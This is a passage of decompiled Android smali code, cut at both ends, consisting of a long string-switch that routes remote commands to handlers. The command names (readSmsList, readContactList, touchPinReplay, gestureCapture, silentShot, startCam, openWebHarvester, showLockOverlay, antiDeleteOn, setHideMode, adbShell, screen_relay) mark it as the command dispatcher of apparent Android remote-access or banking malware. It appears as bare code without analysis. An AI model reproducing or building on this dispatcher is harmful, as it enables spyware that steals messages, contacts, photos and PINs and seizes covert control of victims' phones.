    :sswitch_12
    const-string v12, "openLayer"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x41

    goto/16 :goto_1

    :sswitch_13
    const-string v12, "autoRequestPerm"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x74

    goto/16 :goto_1

    :sswitch_14
    const-string v12, "readSmsList"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x35

    goto/16 :goto_1

    :sswitch_15
    const-string v12, "touchPinReplay"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x89

    goto/16 :goto_1

    :sswitch_16
    const-string v12, "autoBoot"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x72

    goto/16 :goto_1

    :sswitch_17
    const-string v12, "backstage"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x73

    goto/16 :goto_1

    :sswitch_18
    const-string v12, "setDebugMode"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x45

    goto/16 :goto_1

    :sswitch_19
    const-string v12, "startCam"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x13

    goto/16 :goto_1

    :sswitch_1a
    const-string v12, "startApk"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x50

    goto/16 :goto_1

    :sswitch_1b
    const-string v12, "catAllViewSwitch"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x3e

    goto/16 :goto_1

    :sswitch_1c
    const-string v12, "permissionB"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x66

    goto/16 :goto_1

    :sswitch_1d
    const-string v12, "webrtcOffer"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x7a

    goto/16 :goto_1

    :sswitch_1e
    const-string v12, "closeEnv"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x71

    goto/16 :goto_1

    :sswitch_1f
    const-string v12, "adbLockAndroidUpdate"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x98

    goto/16 :goto_1

    :sswitch_20
    const-string v12, "lockUpdate"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0xd

    goto/16 :goto_1

    :sswitch_21
    const-string v12, "installApk"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x52

    goto/16 :goto_1

    :sswitch_22
    const-string v12, "lockScreen"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x29

    goto/16 :goto_1

    :sswitch_23
    const-string v12, "muteDevice"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x2c

    goto/16 :goto_1

    :sswitch_24
    const-string v12, "uninstallShell"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x63

    goto/16 :goto_1

    :sswitch_25
    const-string v12, "adbBlackScreen"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x95

    goto/16 :goto_1

    :sswitch_26
    const-string v12, "lockNormal"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0xc

    goto/16 :goto_1

    :sswitch_27
    const-string v12, "setWakeup"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x83

    goto/16 :goto_1

    :sswitch_28
    const-string v12, "showLockOverlay"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x86

    goto/16 :goto_1

    :sswitch_29
    const-string v12, "doNotDisturb"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x4f

    goto/16 :goto_1

    :sswitch_2a
    const-string v12, "capture"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/4 v12, 0x0

    goto/16 :goto_1

    :sswitch_2b
    const-string v12, "callAcc"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x70

    goto/16 :goto_1

    :sswitch_2c
    const-string v12, "stopAdbStream"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x9f

    goto/16 :goto_1

    :sswitch_2d
    const-string v12, "touchMove"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x19

    goto/16 :goto_1

    :sswitch_2e
    const-string v12, "touchDown"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x17

    goto/16 :goto_1

    :sswitch_2f
    const-string v12, "logMode"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x4a

    goto/16 :goto_1

    :sswitch_30
    const-string v12, "gestureCapture"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x23

    goto/16 :goto_1

    :sswitch_31
    const-string v12, "adbLockUpdate"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x97

    goto/16 :goto_1

    :sswitch_32
    const-string v12, "gestureUnlock"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x21

    goto/16 :goto_1

    :sswitch_33
    const-string v12, "setDebugOn"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x46

    goto/16 :goto_1

    :sswitch_34
    const-string v12, "setHideMode"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x48

    goto/16 :goto_1

    :sswitch_35
    const-string v12, "swipePwdScreenOn"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x84

    goto/16 :goto_1

    :sswitch_36
    const-string v12, "setDomain"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x3d

    goto/16 :goto_1

    :sswitch_37
    const-string v12, "setSoundVibrate"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x4b

    goto/16 :goto_1

    :sswitch_38
    const-string v12, "power"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x28

    goto/16 :goto_1

    :sswitch_39
    const-string v12, "adbBlackScreenOff"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x99

    goto/16 :goto_1

    :sswitch_3a
    const-string v12, "light"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x2f

    goto/16 :goto_1

    :sswitch_3b
    const-string v12, "dndOn"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x4c

    goto/16 :goto_1

    :sswitch_3c
    const-string v12, "black"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x2d

    goto/16 :goto_1

    :sswitch_3d
    const-string v12, "openWebHarvester"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x8a

    goto/16 :goto_1

    :sswitch_3e
    const-string v12, "utResume"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x76

    goto/16 :goto_1

    :sswitch_3f
    const-string v12, "Awake"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x31

    goto/16 :goto_1

    :sswitch_40
    const-string v12, "adbLockNormal"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x96

    goto/16 :goto_1

    :sswitch_41
    const-string v12, "openIntent"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x43

    goto/16 :goto_1

    :sswitch_42
    const-string v12, "silentShot"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/4 v12, 0x7

    goto/16 :goto_1

    :sswitch_43
    const-string v12, "closeNewWin"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x42

    goto/16 :goto_1

    :sswitch_44
    const-string v12, "move"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x1a

    goto/16 :goto_1

    :sswitch_45
    const-string v12, "home"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x25

    goto/16 :goto_1

    :sswitch_46
    const-string v12, "down"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x18

    goto/16 :goto_1

    :sswitch_47
    const-string v12, "back"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x26

    goto/16 :goto_1

    :sswitch_48
    const-string v12, "dnd"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x4e

    goto/16 :goto_1

    :sswitch_49
    const-string v12, "adm"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x5e

    goto/16 :goto_1

    :sswitch_4a
    const-string v12, "up"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x1c

    goto/16 :goto_1

    :sswitch_4b
    const-string v12, "sendAlert"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x40

    goto/16 :goto_1

    :sswitch_4c
    const-string v12, "callAppSetting"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x6f

    goto/16 :goto_1

    :sswitch_4d
    const-string v12, "utPause"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x75

    goto/16 :goto_1

    :sswitch_4e
    const-string v12, "adbDisconnect"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x9b

    goto/16 :goto_1

    :sswitch_4f
    const-string v12, "lockAndroidUpdate"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0xe

    goto/16 :goto_1

    :sswitch_50
    const-string v12, "webrtcIce"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x7b

    goto/16 :goto_1

    :sswitch_51
    const-string v12, "init_data"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x3c

    goto/16 :goto_1

    :sswitch_52
    const-string v12, "startHDBlack"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0xa

    goto/16 :goto_1

    :sswitch_53
    const-string v12, "screenshot"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    move/from16 v12, v16

    goto/16 :goto_1

    :sswitch_54
    const-string v12, "readContactList"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x36

    goto/16 :goto_1

    :sswitch_55
    const-string v12, "smartUnlock"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x88

    goto/16 :goto_1

    :sswitch_56
    const-string v12, "permission"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x65

    goto/16 :goto_1

    :sswitch_57
    const-string v12, "disablePocketMode"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x6d

    goto/16 :goto_1

    :sswitch_58
    const-string v12, "capturePic"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    move/from16 v12, v17

    goto/16 :goto_1

    :sswitch_59
    const-string v12, "stopScreenRelay"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x77

    goto/16 :goto_1

    :sswitch_5a
    const-string v12, "enableAcc"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x9d

    goto/16 :goto_1

    :sswitch_5b
    const-string v12, "iconList"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x7e

    goto/16 :goto_1

    :sswitch_5c
    const-string v12, "clickPoint"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x16

    goto/16 :goto_1

    :sswitch_5d
    const-string v12, "wakeup"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x32

    goto/16 :goto_1

    :sswitch_5e
    const-string v12, "clickInput"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x1e

    goto/16 :goto_1

    :sswitch_5f
    const-string v12, "touchOff"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x12

    goto/16 :goto_1

    :sswitch_60
    const-string v12, "unlock"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x10

    goto/16 :goto_1

    :sswitch_61
    const-string v12, "stopHD"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x9

    goto/16 :goto_1

    :sswitch_62
    const-string v12, "setCam"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x14

    goto/16 :goto_1

    :sswitch_63
    const-string v12, "recent"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x27

    goto/16 :goto_1

    :sswitch_64
    const-string v12, "reConn"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x64

    goto/16 :goto_1

    :sswitch_65
    const-string v12, "adbScreenshot"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x90

    goto/16 :goto_1

    :sswitch_66
    const-string v12, "lightT"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x30

    goto/16 :goto_1

    :sswitch_67
    const-string v12, "takeScreen"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/4 v12, 0x1

    goto/16 :goto_1

    :sswitch_68
    const-string v12, "touchUp"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x1b

    goto/16 :goto_1

    :sswitch_69
    const-string v12, "touchOn"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x11

    goto/16 :goto_1

    :sswitch_6a
    const-string v12, "admLock"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x5c

    goto/16 :goto_1

    :sswitch_6b
    const-string v12, "realtimeOnOff"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x81

    goto/16 :goto_1

    :sswitch_6c
    const-string v12, "adbKeyEvent"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x94

    goto/16 :goto_1

    :sswitch_6d
    const-string v12, "antiDeleteOff"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x57

    goto/16 :goto_1

    :sswitch_6e
    const-string v12, "fetchIcon"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x3b

    goto/16 :goto_1

    :sswitch_6f
    const-string v12, "stopWebRTC"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x79

    goto/16 :goto_1

    :sswitch_70
    const-string v12, "openpkg"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x7f

    goto/16 :goto_1

    :sswitch_71
    const-string v12, "openUrl"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x44

    goto/16 :goto_1

    :sswitch_72
    const-string v12, "uninstallApk"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x51

    goto/16 :goto_1

    :sswitch_73
    const-string v12, "startAdbTree"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0xa0

    goto/16 :goto_1

    :sswitch_74
    const-string v12, "adbSwipe"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x93

    goto/16 :goto_1

    :sswitch_75
    const-string v12, "adbShell"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x8f

    goto/16 :goto_1

    :sswitch_76
    const-string v12, "adbClick"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x92

    goto/16 :goto_1

    :sswitch_77
    const-string v12, "dndOff"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x4d

    goto/16 :goto_1

    :sswitch_78
    const-string v12, "screen_relay"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/4 v12, 0x4

    goto/16 :goto_1

    :sswitch_79
    const-string v12, "readAlbumThumbnail"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x39

    goto/16 :goto_1

    :sswitch_7a
    const-string v12, "clickB"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x1d

    goto/16 :goto_1

    :sswitch_7b
    const-string v12, "reOpenMe"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x62

    goto/16 :goto_1

    :sswitch_7c
    const-string v12, "blackB"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x2e

    goto/16 :goto_1

    :sswitch_7d
    const-string v12, "manualPair"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x8e

    goto/16 :goto_1

    :sswitch_7e
    const-string v12, "rightClick"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x24

    goto/16 :goto_1

    :sswitch_7f
    const-string v12, "iconAlias"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x7d

    goto/16 :goto_1

    :sswitch_80
    const-string v12, "admSet"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x5a

    goto/16 :goto_1

    :sswitch_81
    const-string v12, "admPwd"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x5b

    goto/16 :goto_1

    :sswitch_82
    const-string v12, "reqScreenPermission"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x6a

    goto/16 :goto_1

    :sswitch_83
    const-string v12, "stopHDBlack"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0xb

    goto/16 :goto_1

    :sswitch_84
    const-string v12, "volumeDown"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x2b

    goto/16 :goto_1

    :sswitch_85
    const-string v12, "stopSilentStream"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    move/from16 v12, v18

    goto/16 :goto_1

    :sswitch_86
    const-string v12, "cancelAwake"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x34

    goto/16 :goto_1

    :sswitch_87
    const-string v12, "releaseScreenCapture"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x6b

    goto/16 :goto_1

    :sswitch_88
    const-string v12, "disableAcc"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x9c

    goto/16 :goto_1

    :sswitch_89
    const-string v12, "setDisConnect"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x49

    goto/16 :goto_1

    :sswitch_8a
    const-string v12, "lockAdvance"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0xf

    goto/16 :goto_1

    :sswitch_8b
    const-string v12, "closeProtect"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x6c

    goto/16 :goto_1

    :sswitch_8c
    const-string v12, "readAlbumList"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x37

    goto/16 :goto_1

    :sswitch_8d
    const-string v12, "readAlbumLast"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x38

    goto/16 :goto_1

    :sswitch_8e
    const-string v12, "ask_relay"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x82

    goto/16 :goto_1

    :sswitch_8f
    const-string v12, "antiDeleteOn"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x56

    goto/16 :goto_1

    :sswitch_90
    const-string v12, "cancelWakeup"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x33

    goto/16 :goto_1

    :sswitch_91
    const-string v12, "adbUnlock"

    invoke-virtual {v2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const/16 v12, 0x9a

    goto/16 :goto_1

    :sswitch_92
    const-string v12, "transparent"

